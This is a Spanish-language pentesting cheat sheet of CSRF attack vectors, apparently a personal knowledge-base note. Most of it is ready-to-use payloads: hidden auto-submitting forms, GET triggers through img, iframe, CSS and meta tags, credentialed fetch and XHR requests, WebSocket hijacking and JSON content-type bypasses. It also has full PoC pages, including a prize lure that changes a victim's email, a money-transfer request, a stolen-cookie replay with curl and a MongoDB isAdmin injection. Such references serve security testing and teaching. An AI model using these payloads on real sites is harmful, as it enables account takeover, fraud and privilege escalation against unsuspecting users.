---
aliases:
  - CSRF Attack Vectors
  - CSRF PoC
  - CSRF Payloads
tags:
  - type/technique
  - vuln/csrf
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Vectores de Ataque

***

## HTML Form Auto-Submit (POST)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form action="https://target/profile" method="POST"><input name="email" value="evil@attacker.com"></form><script>document.forms[0].submit()</script>` | POST CSRF auto-submit con JS | Standard PoC. |
| `<body onload="document.forms[0].submit()"><form action="..." method="POST">...</form></body>` | Auto-submit sin event handler | JS-light environments. |
| `<form action="..." method="POST" enctype="multipart/form-data">...</form>` | POST con multipart (sin preflight CORS) | Bypass content-type strict. |
| `<form style="display:none" action="..." method="POST">...</form>` con JS submit | UX silencioso (form invisible) | Stealth. |
| `<iframe src="malicious.html" style="display:none"></iframe>` con form embedded | Embed PoC en otro sitio | Multi-page attack. |
| `curl -X POST -b "session=$VICTIM_COOKIE" https://target/profile -d "email=evil"` (replay manual con cookie robada) | Verificar que endpoint acepta sin CSRF token | Pre-PoC validation. |
^csrf-vector-form

### PoC HTML completo

```html
<!DOCTYPE html>
<html>
<body>
  <h1>You won a prize! Click below.</h1>
  <form id="csrf" action="https://target.com/profile/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="1">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

___

## Image / Link (GET-based)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<img src="https://target/api/delete?id=42">` | GET fired automáticamente sin click | Endpoint write con GET (anti-pattern). |
| `<img src="..." style="display:none" width="0" height="0">` | Hidden image — stealth | Silent attack. |
| `<a href="https://target/transfer?to=attacker&amount=1000">Click</a>` | Requires click — para social eng | Visible vector. |
| `<script>location.href='https://target/...'</script>` | Top-level navigation — pasa SameSite=Lax | SameSite Lax bypass. |
| `<style>body{background:url(https://target/api/...)}</style>` | GET via CSS background | Same effect que img. |
| `<link rel="stylesheet" href="https://target/api/...">` | GET via stylesheet load | CSS-injection chains. |
| `<script src="https://target/api/..."></script>` | GET via script load | Endpoint que ejecuta GET state-change. |
| `<iframe src="https://target/api/...">` | GET en frame | iframe-based. |
| `<meta http-equiv="refresh" content="0;url=https://target/...">` | Top-level redirect | Bypass SameSite Lax. |
| `<video src="https://target/api/...">` o `<audio src="...">` | GET via media tags | Otros tags con GET. |
^csrf-vector-image

___

## JavaScript fetch / XHR

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:'k=v', headers:{'Content-Type':'application/x-www-form-urlencoded'}})` | POST con cookies + sin preflight | CORS simple request. |
| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:JSON.stringify({...}), headers:{'Content-Type':'application/json'}})` | POST JSON (con preflight) | Solo si CORS allow origin. |
| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:new FormData(form)})` | POST multipart sin preflight | Bypass content-type check. |
| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:new URLSearchParams({k:'v'}), keepalive:true})` | Survives page unload | Long-running page. |
| `navigator.sendBeacon('https://target/...', new Blob([body],{type:'application/json'}))` | Async send, no preflight | Beacon API. |
| `var x=new XMLHttpRequest(); x.open('POST','https://target/api/x'); x.withCredentials=true; x.send('k=v')` | XHR clásico con cookies | Pre-fetch fallback. |
| `new WebSocket('wss://target/...')` desde origen atacante (sin Origin check server-side) | CSWSH (CSRF on WebSocket) | WS sin origin validation. |
^csrf-vector-fetch

### fetch sin preflight (CORS simple request)

```javascript
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'  // simple request — no preflight
  },
  body: 'to=attacker&amount=1000'
});
```

___

## JSON / Multipart Content-Type Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<form enctype="text/plain" action="https://target/api"><input name='{"action":"delete","_":' value='_"}'></form>` | Form genera body JSON parseable cross-origin | API JSON tolerante a content-type. |
| `<form enctype="multipart/form-data" action="https://target/api">...</form>` | Multipart sin preflight | API que acepta multipart. |
| `<form enctype="application/x-www-form-urlencoded" action="https://target/api/json"><input name="action" value="delete"></form>` | Form-encoded para API JSON | Backend con dual parser fallback. |
| `<input name="_method" value="PUT">` en form POST | Method override via body | Rails / Symfony. |
| `<form action="https://target/api?_method=DELETE">` | Method override via query | Same idea. |
| `<form enctype="text/plain"><input name='{"$set":{"isAdmin":true},"_":' value='_"}'>` | MongoDB operator inject + JSON CSRF | NoSQL backend. |
| `curl -X POST https://target/api -H "X-HTTP-Method-Override: PUT" -d 'k=v'` (verificar que método override funciona) | Pre-PoC method override probe | Probe antes del PoC. |
^csrf-vector-json

### CSRF JSON via text/plain trick

```html
<!DOCTYPE html>
<html>
<body>
  <form action="https://api.target.com/v1/users/me" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","_dummy":"' value='"}'>
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

Body literal enviado: `{"email":"attacker@evil.com","_dummy":"=" }`. Backend con JSON parser tolerante → email cambiado.

***
